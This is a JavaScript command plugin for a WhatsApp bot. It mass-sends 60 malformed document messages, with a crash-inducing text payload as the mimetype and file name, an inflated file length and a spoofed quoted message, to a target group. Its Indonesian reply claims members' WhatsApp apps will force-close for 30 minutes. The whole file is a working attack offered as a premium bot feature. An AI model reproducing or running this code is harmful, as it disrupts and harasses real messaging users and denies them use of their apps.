let { ngazap } = require('../src/ngazap.js')
let fs = require('fs')
doctext = fs.readFileSync('./src/doctext.txt')
let handler = async(m, { conn, usedPrefix, command, text }) => {
try {
    var troli = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''}) }, "message": {orderMessage: {itemCount: 999999,status: 200, thumbnail: null, surface: 200, message: `© ScrLxrd Md Bot ✓`, orderTitle: `© ScrLxrd Md Bot ✓`, sellerJid: '0@s.whatsapp.net'}}}
    if (!text) { throw `Masukkan Id grup yg mau di serang & Pastikan bot ada di dalam grup tersebut\n\nContoh: ${usedPrefix + command} 6281211233903-1634615611@g.us` 
    } else {
    m.reply(`Berhasil Mengeksekusi Target
    
• Id Grup: ${text}
• Durasi: 30 Menit

Aplikasi WhatsApp Target Yang Ada Di dalam Grup Akan Force Close(Tidak Bisa di Buka) Selama 30 Menit Dari sekarang`)
for (let i = 0;i < 60;i++) {
conn.sendMessage(text, { document: fs.readFileSync('./src/menu.jpg'), mimetype: `${doctext}`, fileName: `${doctext}.pdf`, fileLength: 9999999999, }, { quoted: troli })
}
    }
} catch (e) {
    throw `Error,Pastikan bot ada di dalam grup!`
}
}
handler.premium = true
handler.tags = ['premium']
handler.help = ['atkgc30menit']
handler.command = /^(atkgc30menit|santedgc30menit|seranggc30menit)$/i

module.exports = handler